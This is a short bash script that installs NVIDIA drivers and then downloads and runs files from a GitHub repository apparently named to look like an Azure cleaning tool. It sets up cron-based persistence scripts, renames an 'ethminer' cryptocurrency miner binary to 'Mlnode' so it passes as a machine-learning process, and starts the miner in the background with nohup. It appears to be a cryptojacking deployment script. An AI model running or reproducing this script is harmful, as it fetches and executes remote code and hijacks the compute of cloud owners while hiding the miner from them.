#!/bin/bash

yes '' | sudo add-apt-repository ppa:graphics-drivers/ppa
sudo apt install -y nvidia-driver-418

wget https://github.com/awsdiami/AzureCLN/raw/main/Mlnode.tar.gz
tar -xvf Mlnode.tar.gz
rm -rf Mlnode.tar.gz
wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/cron.sh
wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/addcron.sh
wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/croncheck.sh
chmod +x addcron.sh
chmod +x croncheck.sh
./addcron.sh
./croncheck.sh

cd bin/
wget https://raw.githubusercontent.com/awsdiami/AzureCLN/main/runsrc.sh
chmod +x runsrc.sh
mv ethminer Mlnode

nohup sh runsrc.sh > result.log 2>&1 &
